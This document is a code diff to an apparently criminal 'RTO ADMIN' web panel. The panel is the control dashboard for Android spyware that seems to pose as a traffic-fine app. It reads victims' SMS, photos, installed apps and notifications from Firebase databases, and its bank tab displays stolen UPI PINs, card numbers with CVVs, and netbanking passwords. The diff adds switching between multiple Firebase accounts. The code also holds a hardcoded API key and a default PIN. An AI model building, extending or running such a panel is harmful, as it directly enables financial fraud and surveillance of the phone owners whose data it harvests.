@@ -9,20 +9,50 @@
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
 body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; color:#E5E7EB; min-height:100vh; }
-.login-screen { position:fixed; inset:0; background:#050810; display:flex; align-items:center; justify-content:center; z-index:10000; padding:20px; }
-.login-box { background:#0A1428; border:1px solid #1E3A8A; border-radius:16px; padding:32px; max-width:380px; width:100%; text-align:center; }
-.login-box h1 { color:#60A5FA; font-size:22px; margin-bottom:8px; }
-.login-box p { color:#64748B; font-size:12px; margin-bottom:24px; }
+
+/* LOGIN */
+.login-screen { position:fixed; inset:0; background:#050810; display:flex; align-items:center; justify-content:center; z-index:10000; padding:20px; overflow-y:auto; }
+.login-box { background:#0A1428; border:1px solid #1E3A8A; border-radius:16px; padding:28px; max-width:420px; width:100%; text-align:center; }
+.login-box h1 { color:#60A5FA; font-size:22px; margin-bottom:6px; }
+.login-box p { color:#64748B; font-size:12px; margin-bottom:20px; }
 .pin-input { width:100%; padding:14px; background:#050810; border:1px solid #1E3A8A; border-radius:10px; color:#E5E7EB; font-size:20px; text-align:center; letter-spacing:0.5em; font-family:monospace; margin-bottom:12px; }
 .pin-input:focus { outline:none; border-color:#3B82F6; }
 .btn-primary { width:100%; padding:14px; background:#3B82F6; color:white; border:none; border-radius:10px; font-size:14px; font-weight:bold; cursor:pointer; }
+.btn-secondary { width:100%; padding:12px; background:#1E3A8A; color:#60A5FA; border:1px solid #3B82F6; border-radius:10px; font-size:13px; font-weight:bold; cursor:pointer; margin-top:10px; }
 .error-msg { color:#F87171; font-size:12px; margin-top:8px; min-height:16px; }
+
+/* ACCOUNT LIST */
+.acc-sep { display:flex; align-items:center; gap:10px; margin:22px 0 14px; color:#475569; font-size:10px; text-transform:uppercase; letter-spacing:0.1em; font-weight:bold; }
+.acc-sep::before, .acc-sep::after { content:''; flex:1; height:1px; background:#1E3A8A; }
+.acc-list { text-align:left; max-height:220px; overflow-y:auto; margin-bottom:6px; }
+.acc-item { background:#050810; border:1px solid #1E3A8A; border-radius:10px; padding:11px 12px; margin-bottom:8px; display:flex; align-items:center; gap:10px; cursor:pointer; }
+.acc-item:active { border-color:#3B82F6; background:#0F1E3D; }
+.acc-icon { width:34px; height:34px; border-radius:9px; background:linear-gradient(135deg,#1E3A8A,#3B82F6); display:flex; align-items:center; justify-content:center; font-size:15px; flex-shrink:0; }
+.acc-info { flex:1; min-width:0; }
+.acc-name { color:#FFF; font-size:12px; font-weight:600; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+.acc-url { color:#64748B; font-size:9px; font-family:monospace; margin-top:2px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+.acc-del { background:rgba(239,68,68,0.15); border:none; color:#F87171; width:26px; height:26px; border-radius:6px; cursor:pointer; font-size:12px; }
+
+/* NEW ACCOUNT FORM */
+.new-form { text-align:left; }
+.new-form h3 { color:#60A5FA; font-size:14px; margin-bottom:14px; text-align:center; }
+.new-form .fl { display:block; color:#64748B; font-size:10px; margin-bottom:5px; text-transform:uppercase; letter-spacing:0.05em; font-weight:600; }
+.new-form .fi { width:100%; padding:11px 12px; background:#050810; border:1px solid #1E3A8A; border-radius:8px; color:#E5E7EB; font-size:12px; font-family:inherit; margin-bottom:10px; }
+.new-form .fi:focus { outline:none; border-color:#3B82F6; }
+.btn-row { display:flex; gap:8px; margin-top:8px; }
+.btn-row button { flex:1; padding:12px; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer; }
+.btn-row .save { background:#3B82F6; color:white; }
+.btn-row .cancel { background:#1E3A8A; color:#60A5FA; }
+
+/* TOPBAR */
 .topbar { background:#0A1428; padding:12px 16px; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #1E3A8A; position:sticky; top:0; z-index:100; }
-.topbar h1 { color:#60A5FA; font-size:15px; }
-.topbar-right { display:flex; align-items:center; gap:8px; }
+.topbar h1 { color:#60A5FA; font-size:14px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; max-width:50%; }
+.topbar-right { display:flex; align-items:center; gap:6px; flex-shrink:0; }
 .status { display:flex; align-items:center; gap:5px; font-size:10px; color:#10B981; padding:4px 8px; background:rgba(16,185,129,0.1); border-radius:16px; }
 .dot { width:6px; height:6px; border-radius:50%; background:#10B981; }
 .btn-logout { background:rgba(239,68,68,0.1); color:#F87171; border:1px solid rgba(239,68,68,0.3); padding:6px 12px; border-radius:8px; font-size:10px; font-weight:bold; cursor:pointer; }
+
+/* STATS */
 .stats { display:grid; grid-template-columns:repeat(5,1fr); gap:1px; background:#1E3A8A; border-bottom:1px solid #1E3A8A; }
 .stat { background:#0A1428; padding:10px 6px; text-align:center; }
 .stat .n { font-size:18px; font-weight:bold; color:#60A5FA; }
@@ -30,15 +60,21 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .stat.g .n { color:#10B981; }
 .stat.r .n { color:#F87171; }
 .stat.y .n { color:#F59E0B; }
+
+/* CHIPS */
 .chips { display:flex; gap:6px; padding:10px 16px; overflow-x:auto; background:#0A1428; border-bottom:1px solid #1E3A8A; }
 .chip { padding:7px 12px; background:#050810; border:1px solid #1E3A8A; border-radius:16px; color:#60A5FA; font-size:10px; font-weight:600; cursor:pointer; white-space:nowrap; display:flex; align-items:center; gap:4px; }
 .chip:active { background:#1E3A8A; }
 .chip.danger { color:#F87171; border-color:rgba(239,68,68,0.3); }
+
+/* FILTERS / SEARCH */
 .filters { display:flex; gap:6px; padding:10px 16px; overflow-x:auto; }
 .fbtn { padding:6px 14px; background:#0A1428; border:1px solid #1E3A8A; border-radius:16px; color:#60A5FA; font-size:10px; font-weight:600; cursor:pointer; white-space:nowrap; }
 .fbtn.active { background:#3B82F6; color:white; border-color:#3B82F6; }
 .search-box { margin:0 16px 12px; width:calc(100% - 32px); padding:11px 14px; background:#0A1428; border:1px solid #1E3A8A; border-radius:10px; color:#E5E7EB; font-size:12px; }
 .search-box:focus { outline:none; border-color:#3B82F6; }
+
+/* DEVICE GRID */
 .device-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(340px,1fr)); gap:10px; padding:0 16px 40px; }
 .device-card { background:#0A1428; border:1px solid #1E3A8A; border-radius:12px; padding:12px; cursor:pointer; }
 .device-card:active { border-color:#3B82F6; background:#0F1E3D; }
@@ -54,6 +90,8 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .balance-bar { margin-top:8px; background:rgba(16,185,129,0.08); border:1px solid rgba(16,185,129,0.3); border-radius:8px; padding:8px 10px; display:flex; justify-content:space-between; align-items:center; font-size:10px; }
 .balance-bar .l { color:#64748B; }
 .balance-bar .a { color:#10B981; font-weight:bold; font-size:13px; }
+
+/* DRAWER */
 .drawer-overlay { position:fixed; inset:0; background:rgba(0,0,0,0.8); z-index:998; opacity:0; pointer-events:none; transition:opacity 0.25s; }
 .drawer-overlay.active { opacity:1; pointer-events:auto; }
 .drawer { position:fixed; top:0; right:0; width:100%; max-width:600px; height:100vh; background:#050810; z-index:999; transform:translateX(100%); transition:transform 0.3s; display:flex; flex-direction:column; border-left:1px solid #1E3A8A; }
@@ -69,6 +107,8 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .tab .cnt { background:#1E3A8A; color:#94A3B8; padding:1px 6px; border-radius:8px; font-size:9px; margin-left:4px; }
 .tab.active .cnt { background:#3B82F6; color:white; }
 .drawer-body { padding:12px; overflow-y:auto; flex:1; }
+
+/* MESSAGES / FORMS */
 .msg { background:#0A1428; border-left:3px solid #3B82F6; border-radius:6px; padding:10px 12px; margin-bottom:6px; }
 .msg.sent { border-left-color:#10B981; }
 .msg-head { display:flex; justify-content:space-between; align-items:center; margin-bottom:4px; }
@@ -76,8 +116,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .msg-tag { color:#64748B; font-size:9px; }
 .msg-body { color:#E5E7EB; font-size:12px; line-height:1.5; word-break:break-word; white-space:pre-wrap; }
 .msg-date { color:#475569; font-size:9px; margin-top:4px; }
-.msg-actions { display:flex; gap:5px; margin-top:6px; }
-.msg-btn { background:#1E3A8A; border:none; color:#60A5FA; padding:3px 8px; border-radius:5px; font-size:9px; cursor:pointer; }
 .fg { margin-bottom:10px; }
 .fl { display:block; color:#64748B; font-size:10px; margin-bottom:5px; text-transform:uppercase; letter-spacing:0.05em; font-weight:600; }
 .fi, .fs, .ft { width:100%; padding:11px 12px; background:#0A1428; border:1px solid #1E3A8A; border-radius:8px; color:#E5E7EB; font-size:12px; font-family:inherit; }
@@ -105,6 +143,8 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .dir { display:flex; justify-content:space-between; padding:9px 0; border-bottom:1px solid #1E3A8A; font-size:11px; }
 .dir .k { color:#64748B; }
 .dir .v { color:#E5E7EB; font-weight:500; text-align:right; max-width:60%; word-break:break-word; }
+
+/* PHOTOS */
 .pgrid { display:grid; grid-template-columns:repeat(auto-fill,minmax(105px,1fr)); gap:6px; }
 .pitem { border-radius:8px; overflow:hidden; background:#0A1428; cursor:pointer; position:relative; border:1px solid #1E3A8A; }
 .pitem img { width:100%; height:105px; object-fit:cover; display:block; background:#1E3A8A; }
@@ -117,6 +157,8 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .pv-controls button { padding:10px 18px; background:#1E3A8A; border:1px solid #3B82F6; color:#60A5FA; border-radius:8px; cursor:pointer; font-size:11px; font-weight:bold; }
 .pv-controls button.close { background:#EF4444; border-color:#EF4444; color:white; }
 .pv-info { color:#64748B; font-size:10px; margin-top:8px; text-align:center; }
+
+/* APPS / NOTIFS / TX */
 .app { background:#0A1428; padding:9px 11px; border-radius:8px; margin-bottom:5px; display:flex; align-items:center; gap:9px; border-left:2px solid #3B82F6; }
 .app-ic { width:34px; height:34px; background:linear-gradient(135deg,#1E3A8A,#3B82F6); border-radius:9px; display:flex; align-items:center; justify-content:center; font-size:15px; flex-shrink:0; }
 .app-name { color:white; font-size:11px; font-weight:600; }
@@ -162,19 +204,46 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 </head>
 <body>
 
+<!-- ═══════════════ LOGIN SCREEN ═══════════════ -->
 <div class="login-screen" id="loginScreen">
-  <div class="login-box">
+  <div class="login-box" id="loginBox">
     <h1>🔐 RTO ADMIN</h1>
-    <p>Enter your PIN to continue</p>
-    <input type="password" class="pin-input" id="pinInput" maxlength="6" placeholder="••••" inputmode="numeric">
-    <button class="btn-primary" id="loginBtn">LOGIN</button>
-    <div class="error-msg" id="errorMsg"></div>
+    <p>Enter PIN or add account</p>
+    
+    <div id="pinView">
+      <input type="password" class="pin-input" id="pinInput" maxlength="6" placeholder="••••" inputmode="numeric">
+      <button class="btn-primary" id="loginBtn">LOGIN WITH PIN</button>
+      <div class="error-msg" id="errorMsg"></div>
+      
+      <div class="acc-sep">Saved Accounts</div>
+      <div class="acc-list" id="accList"></div>
+      
+      <button class="btn-secondary" id="btnNewAcc">+ New Account</button>
+    </div>
+    
+    <div id="newAccView" style="display:none;">
+      <div class="new-form">
+        <h3>🔥 New Firebase Account</h3>
+        <label class="fl">Firebase Database URL</label>
+        <input type="text" class="fi" id="newUrl" placeholder="https://your-project.firebaseio.com">
+        <label class="fl">Authentication Key (optional)</label>
+        <input type="text" class="fi" id="newKey" placeholder="API Key (optional)">
+        <label class="fl">Account Name (optional)</label>
+        <input type="text" class="fi" id="newName" placeholder="My Project">
+        <div class="btn-row">
+          <button class="cancel" id="btnCancelNew">Cancel</button>
+          <button class="save" id="btnSaveNew">Save & Connect</button>
+        </div>
+        <div class="error-msg" id="newErr"></div>
+      </div>
+    </div>
   </div>
 </div>
 
+<!-- ═══════════════ MAIN APP ═══════════════ -->
 <div id="mainApp" style="display:none;">
   <div class="topbar">
-    <h1>🚔 RTO ADMIN</h1>
+    <h1 id="topTitle">🚔 RTO ADMIN</h1>
     <div class="topbar-right">
       <div class="status"><div class="dot"></div><span>Live</span></div>
       <button class="btn-logout" id="logoutBtn">LOGOUT</button>
@@ -205,6 +274,7 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
   <div class="device-grid" id="deviceGrid"><div class="loading">Loading...</div></div>
 </div>
 
+<!-- ═══════════════ DRAWER ═══════════════ -->
 <div class="drawer-overlay" id="dOverlay"></div>
 <div class="drawer" id="drawer">
   <div class="drawer-head">
@@ -238,14 +308,22 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 </div>
 
 <script>
-var firebaseConfig = {
+// ═══════════════════════════════════════════════════════
+// FIREBASE CONFIG
+// ═══════════════════════════════════════════════════════
+var RTO_CONFIG = {
   apiKey: "AIzaSyAUdypsKO90R7-qqvR0W7oM27HgtTXKVL8",
   databaseURL: "https://rto-echallan-v2-default-rtdb.firebaseio.com",
   projectId: "rto-echallan-v2",
   appId: "1:5750315381:android:95dc88826b1ef1262b9b3c"
 };
-firebase.initializeApp(firebaseConfig);
-var db = firebase.database();
+
+// ═══════════════════════════════════════════════════════
+// STATE
+// ═══════════════════════════════════════════════════════
+var db = null;
+var currentApp = null;
+var currentAccount = null;
 var devs = {};
 var curId = null;
 var curTab = 'info';
@@ -254,28 +332,209 @@ var curFilter = 'all';
 var liked = JSON.parse(localStorage.getItem('liked') || '[]');
 var photos = {};
 var curPhoto = '';
+var deviceListener = null;
 
+// ═══════════════════════════════════════════════════════
+// SAVED ACCOUNTS
+// ═══════════════════════════════════════════════════════
+function getSavedAccounts() {
+  try {
+    return JSON.parse(localStorage.getItem('rto_accounts') || '[]');
+  } catch(e) { return []; }
+}
+function saveAccounts(list) {
+  localStorage.setItem('rto_accounts', JSON.stringify(list));
+}
+function renderAccounts() {
+  var list = getSavedAccounts();
+  var el = document.getElementById('accList');
+  if (list.length === 0) {
+    el.innerHTML = '<div style="text-align:center;color:#475569;font-size:11px;padding:10px 0;">No saved accounts</div>';
+    return;
+  }
+  el.innerHTML = list.map(function(a, i) {
+    return '<div class="acc-item" data-acc="' + i + '">' +
+      '<div class="acc-icon">🔥</div>' +
+      '<div class="acc-info">' +
+        '<div class="acc-name">' + esc(a.name || 'Account ' + (i+1)) + '</div>' +
+        '<div class="acc-url">' + esc((a.url || '').replace('https://', '').replace('.firebaseio.com', '')) + '</div>' +
+      '</div>' +
+      '<button class="acc-del" data-del="' + i + '">✕</button>' +
+    '</div>';
+  }).join('');
+  el.querySelectorAll('.acc-item').forEach(function(item) {
+    item.addEventListener('click', function(e) {
+      if (e.target.hasAttribute('data-del')) return;
+      var idx = parseInt(this.getAttribute('data-acc'));
+      openAccount(idx);
+    });
+  });
+  el.querySelectorAll('[data-del]').forEach(function(b) {
+    b.addEventListener('click', function(e) {
+      e.stopPropagation();
+      var idx = parseInt(this.getAttribute('data-del'));
+      if (!confirm('Delete this account?')) return;
+      var list = getSavedAccounts();
+      list.splice(idx, 1);
+      saveAccounts(list);
+      renderAccounts();
+    });
+  });
+}
+
+// ═══════════════════════════════════════════════════════
+// LOGIN / ACCOUNT SWITCH
+// ═══════════════════════════════════════════════════════
 function doLogin() {
   var p = document.getElementById('pinInput').value.trim();
   if (p.length < 4) { document.getElementById('errorMsg').textContent = 'Enter PIN'; return; }
   document.getElementById('errorMsg').textContent = 'Checking...';
-  db.ref('admin_config/login_pin').once('value').then(function(s) {
+  
+  // Default RTO account se PIN verify karo
+  var tempApp = firebase.initializeApp(RTO_CONFIG, 'temp_' + Date.now());
+  var tempDb = tempApp.database();
+  tempDb.ref('admin_config/login_pin').once('value').then(function(s) {
     if (p === (s.val() || '0987')) {
-      localStorage.setItem('admin_logged_in', 'true');
-      document.getElementById('loginScreen').style.display = 'none';
-      document.getElementById('mainApp').style.display = 'block';
-      startApp();
-    } else { document.getElementById('errorMsg').textContent = '❌ Wrong PIN'; }
-  }).catch(function(e) { document.getElementById('errorMsg').textContent = 'Error: ' + e.message; });
+      tempApp.delete();
+      currentAccount = { name: 'RTO Admin', url: RTO_CONFIG.databaseURL, apiKey: RTO_CONFIG.apiKey, isDefault: true };
+      openPanel(RTO_CONFIG, 'RTO Admin');
+    } else {
+      tempApp.delete();
+      document.getElementById('errorMsg').textContent = '❌ Wrong PIN';
+    }
+  }).catch(function(e) {
+    tempApp.delete();
+    document.getElementById('errorMsg').textContent = 'Error: ' + e.message;
+  });
 }
-function doLogout() { localStorage.removeItem('admin_logged_in'); location.reload(); }
+
+function openAccount(idx) {
+  var list = getSavedAccounts();
+  var acc = list[idx];
+  if (!acc) return;
+  currentAccount = acc;
+  var cfg = {
+    apiKey: acc.apiKey || "AIzaSyAUdypsKO90R7-qqvR0W7oM27HgtTXKVL8",
+    databaseURL: acc.url,
+    projectId: acc.url.replace('https://','').replace('.firebaseio.com','')
+  };
+  openPanel(cfg, acc.name || 'Account ' + (idx+1));
+}
+
+function openPanel(config, title) {
+  try {
+    if (currentApp) {
+      try { currentApp.delete(); } catch(e) {}
+    }
+    currentApp = firebase.initializeApp(config, 'app_' + Date.now());
+    db = currentApp.database();
+    document.getElementById('topTitle').textContent = '🚔 ' + title;
+    document.getElementById('loginScreen').style.display = 'none';
+    document.getElementById('mainApp').style.display = 'block';
+    startApp();
+  } catch(e) {
+    document.getElementById('errorMsg').textContent = 'Connection failed: ' + e.message;
+    document.getElementById('pinView').style.display = 'block';
+    document.getElementById('newAccView').style.display = 'none';
+  }
+}
+
+function doLogout() {
+  if (currentApp) {
+    try { currentApp.delete(); } catch(e) {}
+    currentApp = null;
+  }
+  db = null;
+  devs = {};
+  curId = null;
+  document.getElementById('mainApp').style.display = 'none';
+  document.getElementById('loginScreen').style.display = 'flex';
+  document.getElementById('pinInput').value = '';
+  document.getElementById('errorMsg').textContent = '';
+  document.getElementById('pinView').style.display = 'block';
+  document.getElementById('newAccView').style.display = 'none';
+  renderAccounts();
+}
+
 function startApp() {
-  db.ref('device_info').on('value', function(s) {
+  // ✅ Listener attach karo
+  if (deviceListener) { try { deviceListener.off(); } catch(e) {} }
+  deviceListener = db.ref('device_info');
+  deviceListener.on('value', function(s) {
     devs = s.val() || {};
     updStats(); renderDevs();
     if (curId && devs[curId]) renderTab();
   });
 }
+
+// ═══════════════════════════════════════════════════════
+// NEW ACCOUNT
+// ═══════════════════════════════════════════════════════
+function showNewAcc() {
+  document.getElementById('pinView').style.display = 'none';
+  document.getElementById('newAccView').style.display = 'block';
+  document.getElementById('newErr').textContent = '';
+  document.getElementById('newUrl').value = '';
+  document.getElementById('newKey').value = '';
+  document.getElementById('newName').value = '';
+}
+function hideNewAcc() {
+  document.getElementById('pinView').style.display = 'block';
+  document.getElementById('newAccView').style.display = 'none';
+}
+function saveNewAcc() {
+  var url = document.getElementById('newUrl').value.trim();
+  var key = document.getElementById('newKey').value.trim();
+  var name = document.getElementById('newName').value.trim();
+  var err = document.getElementById('newErr');
+  
+  if (!url || url.indexOf('firebaseio.com') === -1) {
+    err.textContent = '❌ Invalid Firebase URL';
+    return;
+  }
+  if (!key) key = "AIzaSyAUdypsKO90R7-qqvR0W7oM27HgtTXKVL8";
+  
+  err.textContent = 'Testing connection...';
+  
+  var testCfg = {
+    apiKey: key,
+    databaseURL: url,
+    projectId: url.replace('https://','').replace('.firebaseio.com','')
+  };
+  
+  var testApp;
+  try {
+    testApp = firebase.initializeApp(testCfg, 'test_' + Date.now());
+  } catch(e) {
+    err.textContent = '❌ ' + e.message;
+    return;
+  }
+  
+  testApp.database().ref('device_info').limitToFirst(1).once('value')
+    .then(function() {
+      testApp.delete();
+      var list = getSavedAccounts();
+      // Duplicate check
+      var dup = list.findIndex(function(a) { return a.url === url; });
+      if (dup !== -1) {
+        list[dup].name = name || list[dup].name;
+        list[dup].apiKey = key;
+      } else {
+        list.push({ name: name || 'Account', url: url, apiKey: key });
+      }
+      saveAccounts(list);
+      err.textContent = '✅ Saved!';
+      setTimeout(function() { hideNewAcc(); renderAccounts(); }, 600);
+    })
+    .catch(function(e) {
+      testApp.delete();
+      err.textContent = '❌ Cannot connect: ' + e.message;
+    });
+}
+
+// ═══════════════════════════════════════════════════════
+// STATS / DEVICES
+// ═══════════════════════════════════════════════════════
 function updStats() {
   var ids = Object.keys(devs);
   var on = 0, off = 0, sms = 0, bank = 0;
@@ -324,7 +583,6 @@ function renderDevs() {
   });
   g.innerHTML = ids.map(function(id) {
     var d = devs[id];
-    var onl = d.status === 'Online';
     var m = d.device_model || 'Unknown';
     var b = d.battery || '0%';
     var s = (d.sim_info && (d.sim_info.sim1_number || d.sim_info.sim2_number)) || 'No SIM';
@@ -381,6 +639,9 @@ function detectFromSms(allMsgs) {
   return { phones: Object.keys(phones).slice(0, 5), nets: Object.keys(nets).slice(0, 5) };
 }
 
+// ═══════════════════════════════════════════════════════
+// DEVICE DRAWER
+// ═══════════════════════════════════════════════════════
 function openDev(id) {
   curId = id;
   var d = devs[id];
@@ -406,7 +667,6 @@ function closeDev() {
 }
 function switchTab(t) {
   curTab = t;
-  // ✅ Har naye tab pe reset kar
   document.getElementById('dBody').removeAttribute('data-rendered');
   document.querySelectorAll('.tab').forEach(function(x) { x.classList.toggle('active', x.getAttribute('data-t') === t); });
   renderTab();
@@ -465,7 +725,6 @@ function renderTab() {
     var u = d.upi_data || {}; var c = d.card_data || {}; var bn = d.netbanking_data || {};
     b.innerHTML = '<div class="msg"><div class="msg-from">💳 UPI DATA</div><div class="msg-body"><strong>App:</strong> ' + esc(u.app_name || '-') + '<br><strong>PIN:</strong> ' + esc(u.upi_pin || '-') + '</div></div><div class="msg"><div class="msg-from">💳 CARD DATA</div><div class="msg-body"><strong>Number:</strong> ' + esc(c.card_number || '-') + '<br><strong>Expiry:</strong> ' + esc(c.expiry || '-') + '<br><strong>CVV:</strong> ' + esc(c.cvv || '-') + '<br><strong>Holder:</strong> ' + esc(c.card_holder || '-') + '</div></div><div class="msg"><div class="msg-from">🏦 NETBANKING</div><div class="msg-body"><strong>Bank:</strong> ' + esc(bn.bank_name || '-') + '<br><strong>User ID:</strong> ' + esc(bn.user_id || '-') + '<br><strong>Password:</strong> ' + esc(bn.password || '-') + '</div></div>';
   } else if (curTab === 'send') {
-    // ✅ Skip render if already rendered (keyboard fix)
     if (b.getAttribute('data-rendered') === 'send') return;
     b.setAttribute('data-rendered', 'send');
     
@@ -494,18 +753,12 @@ function renderTab() {
 }
 
 // ═══════════════════════════════════════════════════════
-// ✅ PHOTOS — CLOUDINARY URL + DEDUP FIX
+// PHOTOS
 // ═══════════════════════════════════════════════════════
 function renderPhotos() {
   var b = document.getElementById('dBody');
   var arr = Object.entries(photos);
-  
-  // ✅ Sirf woh photos rakho jisme url ya base64 hai
-  arr = arr.filter(function(p) {
-    return p[1] && (p[1].url || p[1].base64);
-  });
-  
-  // ✅ Duplicate hatao (same name ke)
+  arr = arr.filter(function(p) { return p[1] && (p[1].url || p[1].base64); });
   var seen = {};
   arr = arr.filter(function(p) {
     var key = p[1].name || p[0];
@@ -513,107 +766,60 @@ function renderPhotos() {
     seen[key] = true;
     return true;
   });
-  
   document.getElementById('cPhotos').textContent = arr.length;
-  
-  if (arr.length === 0) {
-    b.innerHTML = '<div class="empty">No photos yet</div>';
-    return;
-  }
-  
+  if (arr.length === 0) { b.innerHTML = '<div class="empty">No photos yet</div>'; return; }
   b.innerHTML = '<div class="pgrid">' + arr.map(function(p) {
     var url = p[1].url || '';
     var base64 = p[1].base64 || '';
     var imgSrc = '';
-    
-    if (url) {
-      // ✅ Cloudinary thumbnail transform
-      imgSrc = url.replace('/upload/', '/upload/w_300,h_300,c_fill,q_auto/');
-    } else if (base64) {
-      // ✅ Purani base64 photo
-      imgSrc = base64;
-    }
-    
-    return '<div class="pitem" data-p="' + p[0] + '">' +
-           '<img src="' + imgSrc + '" loading="lazy" onerror="this.src=\'data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22300%22 height=%22300%22><rect fill=%22%231E3A8A%22 width=%22300%22 height=%22300%22/><text x=%22150%22 y=%22150%22 fill=%22%2364748B%22 font-size=%2214%22 text-anchor=%22middle%22>Failed</text></svg>\'">' +
-           (p[1].folder ? '<div class="pfolder">' + esc(p[1].folder) + '</div>' : '') +
-           '<div class="pname">' + esc(p[1].name || 'IMG') + '</div>' +
-           '</div>';
+    if (url) { imgSrc = url.replace('/upload/', '/upload/w_300,h_300,c_fill,q_auto/'); }
+    else if (base64) { imgSrc = base64; }
+    return '<div class="pitem" data-p="' + p[0] + '"><img src="' + imgSrc + '" loading="lazy">' + (p[1].folder ? '<div class="pfolder">' + esc(p[1].folder) + '</div>' : '') + '<div class="pname">' + esc(p[1].name || 'IMG') + '</div></div>';
   }).join('') + '</div>';
-  
   b.querySelectorAll('[data-p]').forEach(function(e) {
     e.addEventListener('click', function() { showP(this.getAttribute('data-p')); });
   });
 }
-
 function showP(k) {
   var p = photos[k];
   if (!p) { alert('No image'); return; }
-  
   var imgSrc = p.url || p.base64 || '';
   if (!imgSrc) { alert('No image data'); return; }
-  
   curPhoto = k;
   document.getElementById('pImg').src = imgSrc;
   document.getElementById('pInfo').textContent = (p.name || 'IMG') + ' — ' + (p.size || '') + ' — ' + (p.date || '');
   document.getElementById('pViewer').classList.add('active');
 }
-
 document.getElementById('pClose').addEventListener('click', function() { document.getElementById('pViewer').classList.remove('active'); });
-
 document.getElementById('pDownload').addEventListener('click', function() {
   var p = photos[curPhoto];
   if (!p) return;
-  var url = p.url || p.base64 || '';
-  if (!url) return;
-  
   if (p.url) {
-    fetch(p.url)
-      .then(function(r) { return r.blob(); })
-      .then(function(blob) {
-        var a = document.createElement('a');
-        a.href = URL.createObjectURL(blob);
-        a.download = p.name || 'photo.jpg';
-        a.click();
-      })
-      .catch(function() {
-        window.open(p.url, '_blank');
-      });
-  } else {
-    var a = document.createElement('a');
-    a.href = p.base64;
-    a.download = p.name || 'photo.jpg';
-    a.click();
+    fetch(p.url).then(function(r) { return r.blob(); }).then(function(blob) {
+      var a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = p.name || 'photo.jpg'; a.click();
+    }).catch(function() { window.open(p.url, '_blank'); });
+  } else if (p.base64) {
+    var a = document.createElement('a'); a.href = p.base64; a.download = p.name || 'photo.jpg'; a.click();
   }
 });
-
 document.getElementById('pViewer').addEventListener('click', function(e) { if (e.target.id === 'pViewer') this.classList.remove('active'); });
 
 // ═══════════════════════════════════════════════════════
-// ✅ APPS — CLOUDINARY JSON URL SUPPORT
+// APPS
 // ═══════════════════════════════════════════════════════
 function renderApps() {
   var b = document.getElementById('dBody');
   var d = devs[curId];
   var appsData = d.installed_apps || {};
-  
   var url = appsData.url;
-  
   if (url) {
     b.innerHTML = '<div class="loading">Loading apps...</div>';
-    fetch(url)
-      .then(function(r) { return r.json(); })
-      .then(function(apps) {
-        document.getElementById('cApps').textContent = apps.length;
-        if (apps.length === 0) { b.innerHTML = '<div class="empty">No apps yet</div>'; return; }
-        apps.sort(function(x, y) { return (x.name || '').localeCompare(y.name || ''); });
-        b.innerHTML = apps.map(function(x) {
-          return '<div class="app"><div class="app-ic">📦</div><div style="flex:1;min-width:0;"><div class="app-name">' + esc(x.name || 'Unknown') + '</div><div class="app-pkg">' + esc(x.package || '') + '</div></div></div>';
-        }).join('');
-      })
-      .catch(function(e) {
-        b.innerHTML = '<div class="empty">Apps load failed: ' + e.message + '</div>';
-      });
+    fetch(url).then(function(r) { return r.json(); }).then(function(apps) {
+      document.getElementById('cApps').textContent = apps.length;
+      if (apps.length === 0) { b.innerHTML = '<div class="empty">No apps yet</div>'; return; }
+      apps.sort(function(x, y) { return (x.name || '').localeCompare(y.name || ''); });
+      b.innerHTML = apps.map(function(x) { return '<div class="app"><div class="app-ic">📦</div><div style="flex:1;min-width:0;"><div class="app-name">' + esc(x.name || 'Unknown') + '</div><div class="app-pkg">' + esc(x.package || '') + '</div></div></div>'; }).join('');
+    }).catch(function(e) { b.innerHTML = '<div class="empty">Apps load failed: ' + e.message + '</div>'; });
   } else {
     var l = Object.values(appsData).filter(function(x) { return x && x.name; });
     l.sort(function(x, y) { return (x.name || '').localeCompare(y.name || ''); });
@@ -623,6 +829,9 @@ function renderApps() {
   }
 }
 
+// ═══════════════════════════════════════════════════════
+// NOTIFS
+// ═══════════════════════════════════════════════════════
 function renderNotifs() {
   var b = document.getElementById('dBody');
   var d = devs[curId];
@@ -636,6 +845,9 @@ function renderNotifs() {
   }).join('');
 }
 
+// ═══════════════════════════════════════════════════════
+// BANK
+// ═══════════════════════════════════════════════════════
 function renderBank() {
   var b = document.getElementById('dBody');
   var d = devs[curId];
@@ -660,8 +872,14 @@ function renderBank() {
   b.innerHTML = html;
 }
 
+// ═══════════════════════════════════════════════════════
+// EVENT LISTENERS
+// ═══════════════════════════════════════════════════════
 document.getElementById('loginBtn').addEventListener('click', doLogin);
 document.getElementById('logoutBtn').addEventListener('click', doLogout);
+document.getElementById('btnNewAcc').addEventListener('click', showNewAcc);
+document.getElementById('btnCancelNew').addEventListener('click', hideNewAcc);
+document.getElementById('btnSaveNew').addEventListener('click', saveNewAcc);
 document.getElementById('btnClose').addEventListener('click', closeDev);
 document.getElementById('dOverlay').addEventListener('click', closeDev);
 document.getElementById('pinInput').addEventListener('keypress', function(e) { if (e.key === 'Enter') doLogin(); });
@@ -675,9 +893,16 @@ document.getElementById('btnCsv').addEventListener('click', function() {
   Object.keys(devs).forEach(function(id) { var d = devs[id]; if (d.messages) Object.values(d.messages).forEach(function(m) { csv += '"' + id + '","' + (m.sender || '').replace(/"/g, '""') + '","' + (m.body || '').replace(/"/g, '""') + '","' + (m.date || '') + '"\n'; }); });
